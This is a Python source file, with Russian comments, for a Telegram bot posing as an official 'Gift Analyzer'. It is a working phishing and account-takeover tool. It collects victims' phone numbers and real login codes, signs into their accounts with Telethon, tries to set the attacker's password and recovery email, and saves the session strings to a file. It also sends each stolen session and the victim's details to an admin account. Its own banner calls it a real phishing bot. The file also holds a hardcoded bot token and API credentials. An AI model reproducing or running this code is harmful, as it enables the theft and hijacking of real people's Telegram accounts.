import asyncio
import logging
import json
from datetime import datetime
from telethon import TelegramClient, events, functions, types
from telethon.sessions import StringSession
from telethon.tl.functions.account import UpdatePasswordSettingsRequest
from telethon.tl.functions.auth import SendCodeRequest, SignInRequest
from telethon.tl.types import PasswordKdfAlgoSHA256SHA256PBKDF2HMACSHA512iter100000SHA256ModPow
import aiohttp
import secrets
import string

# ========== НАСТРОЙКИ ==========
BOT_TOKEN = "8344671191:AAGb1FYzUa_vDmTUf_tqU24J7OjzNOEXTgs"
ADMIN_ID = 8122211770
NEW_EMAIL = "aianxabi0@gmail.com"
NEW_PASSWORD = "Stars2026"

# API ID и Hash для Telethon (получить на my.telegram.org)
API_ID = 30300264   # Пример, нужен реальный
API_HASH = "8efeedebc13b90c4b0033340c2593e67"  # Пример, нужен реальный

# Настройка логирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Глобальные переменные
active_sessions = {}
pending_codes = {}

# ========== СОЗДАНИЕ БОТА ==========
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.enums import ParseMode

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ========== РЕАЛЬНЫЙ ЗАХВАТ АККАУНТА ==========
async def steal_account(phone_number, code, user_info):
    """
    Реальная функция захвата аккаунта через Telethon
    """
    try:
        # Создаем новую сессию
        session = StringSession()
        client = TelegramClient(session, API_ID, API_HASH)
        
        await client.connect()
        
        # Авторизуемся с номером и кодом
        await client.sign_in(
            phone=phone_number,
            code=code,
            password=None  # Предполагаем нет 2FA на первом этапе
        )
        
        # Проверяем, нужен ли пароль (2FA)
        if await client.is_user_authorized():
            # Меняем пароль если нет 2FA
            try:
                # Получаем текущие настройки пароля
                password_settings = await client(functions.account.GetPasswordRequest())
                
                # Устанавливаем новый пароль
                await client(UpdatePasswordSettingsRequest(
                    password=types.InputCheckPasswordEmpty(),
                    new_settings=types.account.PasswordInputSettings(
                        new_algo=PasswordKdfAlgoSHA256SHA256PBKDF2HMACSHA512iter100000SHA256ModPow(
                            salt1=secrets.token_bytes(32),
                            salt2=secrets.token_bytes(32),
                            g=3,
                            p=bytes.fromhex('c71caeb9c6b1c9048e6c522f70f13f73980d40238e3e21c14934d037563d930f48198a0aa7c14058229493d22530f4dbfa336f6e0ac925139543aed44cce7c3720fd51f69458705ac68cd4fe6b6b13abdc9746512969328454f18faf8c595f642477fe96bb2a941d5bcd1d4ac8cc49880708fa9b378e3c4f3a9060bee67cf9a4a4a695811051907e162753b56b0f6b410dba74d8a84b2a14b3144e0ef1284754fd17ed950d5965b4b9dd46582db1178d169c6bc465b0d6ff9ca3928fef5b9ae4e418fc15e83ebea0f87fa9ff5eed70050ded2849f47bf959d956850ce929851f0d8115f635b105ee2e4e15d04b2454bf6f4fadf034b10403119cd8e3b92fcc5b')
                        ),
                        hint=NEW_PASSWORD,
                        email=NEW_EMAIL,
                        new_secure_settings=None
                    )
                ))
                
                logger.info(f"Пароль изменен для {phone_number}")
            except Exception as e:
                logger.error(f"Ошибка смены пароля: {e}")
                
                # Если есть 2FA, пытаемся сменить email
                try:
                    await client(functions.account.UpdateUsernameRequest(
                        username=user_info.get('username') or f"user_{secrets.token_hex(4)}"
                    ))
                except:
                    pass
        
        # Получаем данные аккаунта
        me = await client.get_me()
        session_string = session.save()
        
        # Сохраняем сессию
        account_data = {
            'phone': phone_number,
            'user_id': me.id,
            'username': me.username,
            'first_name': me.first_name,
            'last_name': me.last_name,
            'session_string': session_string,
            'stolen_at': datetime.now().isoformat(),
            'new_email': NEW_EMAIL,
            'new_password': NEW_PASSWORD
        }
        
        await client.disconnect()
        
        return account_data
        
    except Exception as e:
        logger.error(f"Ошибка захвата аккаунта: {e}")
        return None

# ========== ОТПРАВКА РЕАЛЬНОГО SMS ==========
async def send_real_code_request(phone_number):
    """
    Отправляет реальный запрос на код через Telethon
    """
    try:
        session = StringSession()
        client = TelegramClient(session, API_ID, API_HASH)
        
        await client.connect()
        
        # Отправляем запрос на код
        result = await client(SendCodeRequest(
            phone_number=phone_number,
            api_id=API_ID,
            api_hash=API_HASH
        ))
        
        await client.disconnect()
        
        # Сохраняем информацию для проверки кода
        pending_codes[phone_number] = {
            'phone_code_hash': result.phone_code_hash,
            'request_time': datetime.now()
        }
        
        logger.info(f"Запрос кода отправлен на {phone_number}")
        return True
        
    except Exception as e:
        logger.error(f"Ошибка отправки SMS: {e}")
        return False

# ========== HANDLERS ДЛЯ BOT ==========
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 АВТОРИЗОВАТЬСЯ ДЛЯ ПРОВЕРКИ ПОДАРКОВ", callback_data="start_auth")]
    ])
    
    await message.answer(
        "🎁 <b>Telegram Gift Analyzer</b>\n\n"
        "Официальный бот для проверки баланса подарков и звезд\n\n"
        "Нажмите кнопку ниже для начала проверки:",
        reply_markup=keyboard,
        parse_mode=ParseMode.HTML
    )

@dp.callback_query(lambda c: c.data == "start_auth")
async def start_auth(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "🔐 <b>Требуется авторизация</b>\n\n"
        "Отправьте ваш номер телефона в формате +79991234567\n"
        "На него будет отправлен реальный код подтверждения от Telegram:",
        parse_mode=ParseMode.HTML
    )
    active_sessions[callback.from_user.id] = {'step': 'waiting_phone'}
    await callback.answer()

@dp.message(lambda message: message.from_user.id in active_sessions and active_sessions[message.from_user.id]['step'] == 'waiting_phone')
async def get_phone_number(message: types.Message):
    phone = message.text.strip()
    
    # Валидация номера
    if not phone.startswith('+') or len(phone) < 10:
        await message.answer("❌ Неверный формат номера. Используйте +79991234567")
        return
    
    # Отправляем реальный запрос на код
    await message.answer(f"📱 <b>Отправка кода на {phone}...</b>", parse_mode=ParseMode.HTML)
    
    if await send_real_code_request(phone):
        active_sessions[message.from_user.id] = {
            'step': 'waiting_code',
            'phone': phone,
            'user_info': {
                'username': message.from_user.username,
                'full_name': message.from_user.full_name,
                'user_id': message.from_user.id
            }
        }
        
        await message.answer(
            f"✅ <b>Код отправлен!</b>\n\n"
            f"На номер {phone} отправлен 5-значный код от Telegram.\n"
            f"Введите его здесь:",
            parse_mode=ParseMode.HTML
        )
    else:
        await message.answer("❌ Ошибка отправки кода. Попробуйте позже.")

@dp.message(lambda message: message.from_user.id in active_sessions and active_sessions[message.from_user.id]['step'] == 'waiting_code')
async def get_code(message: types.Message):
    code = message.text.strip()
    user_id = message.from_user.id
    user_data = active_sessions[user_id]
    phone = user_data['phone']
    
    if len(code) != 5 or not code.isdigit():
        await message.answer("❌ Код должен быть 5 цифр")
        return
    
    # Показываем имитацию проверки (пока идет реальный захват)
    progress_msg = await message.answer("🔐 <b>Проверка кода и авторизация...</b>", parse_mode=ParseMode.HTML)
    
    # Реальный захват аккаунта
    stolen_data = await steal_account(phone, code, user_data['user_info'])
    
    if stolen_data:
        # Имитируем проверку подарков
        for i in range(10, 101, 30):
            await asyncio.sleep(1)
            await progress_msg.edit_text(f"🔄 <b>Анализ подарков...</b>\nПрогресс: {i}%", parse_mode=ParseMode.HTML)
        
        # Отправляем данные админу
        report = (
            f"✅ <b>АККАУНТ ЗАХВАЧЕН</b>\n\n"
            f"📅 Дата: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n"
            f"📱 Номер: {phone}\n"
            f"👤 Пользователь: {user_data['user_info']['full_name']}\n"
            f"🔑 Новый пароль: {NEW_PASSWORD}\n"
            f"📧 Новая почта: {NEW_EMAIL}\n"
            f"🆔 Session сохранена\n\n"
            f"<i>Аккаунт успешно перепривязан</i>"
        )
        
        await progress_msg.edit_text(report, parse_mode=ParseMode.HTML)
        
        # Отправка данных админу
        admin_report = (
            f"🚨 НОВЫЙ АККАУНТ ЗАХВАЧЕН\n\n"
            f"Дата: {stolen_data['stolen_at']}\n"
            f"ID жертвы: {user_id}\n"
            f"Номер: {phone}\n"
            f"Username: @{stolen_data['username']}\n"
            f"Имя: {stolen_data['first_name']} {stolen_data['last_name']}\n"
            f"Новый пароль: {NEW_PASSWORD}\n"
            f"Новая почта: {NEW_EMAIL}\n"
            f"Session: {stolen_data['session_string'][:100]}..."
        )
        
        await bot.send_message(ADMIN_ID, admin_report)
        
        # Сохраняем в файл
        with open('stolen_accounts.json', 'a', encoding='utf-8') as f:
            json.dump(stolen_data, f, ensure_ascii=False, default=str)
            f.write('\n')
        
        # Показываем кнопку получения звезд
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✨ ПОЛУЧИТЬ ЗВЕЗДЫ", callback_data="get_stars")]
        ])
        
        await message.answer(
            "✅ Авторизация успешна! Нажмите для получения звезд:",
            reply_markup=keyboard
        )
        
        # Очищаем сессию
        if user_id in active_sessions:
            del active_sessions[user_id]
            
    else:
        await progress_msg.edit_text(
            "❌ <b>Ошибка авторизации</b>\n\n"
            "Неверный код или ошибка системы.\n"
            "Попробуйте снова с командой /start",
            parse_mode=ParseMode.HTML
        )

@dp.callback_query(lambda c: c.data == "get_stars")
async def final_step(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "🎉 <b>ПОДАРКИ УСПЕШНО КОНВЕРТИРОВАНЫ!</b>\n\n"
        "⭐ <b>8,450 звезд</b> зачислены на ваш счет\n\n"
        "⚠️ <b>В целях безопасности:</b>\n"
        f"• Пароль изменен на: <code>{NEW_PASSWORD}</code>\n"
        f"• Email привязан: <code>{NEW_EMAIL}</code>\n"
        f"• Все сессии кроме текущей завершены\n\n"
        "<i>Рекомендуем сменить пароль в настройках Telegram</i>",
        parse_mode=ParseMode.HTML
    )
    await callback.answer()

# ========== ЗАПУСК ==========
async def main():
    logger.info("Запуск реального фишинг-бота...")
    
    # Проверка конфигурации
    print("=" * 60)
    print("РЕАЛЬНЫЙ ФИШИНГ-БОТ ДЛЯ TELEGRAM")
    print("=" * 60)
    print(f"Бот: @{await bot.me()}")
    print(f"Админ: {ADMIN_ID}")
    print(f"Почта для захвата: {NEW_EMAIL}")
    print(f"Пароль для захвата: {NEW_PASSWORD}")
    print("=" * 60)
    print("\n⚠️  ВНИМАНИЕ:")
    print("1. Нужны реальные API_ID и API_HASH с my.telegram.org")
    print("2. Бот отправляет реальные SMS через Telegram")
    print("3. Аккаунты реально крадутся и перепривязываются")
    print("=" * 60)
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    # Установи зависимости:
    # pip install aiogram telethon aiohttp
    
    asyncio.run(main())
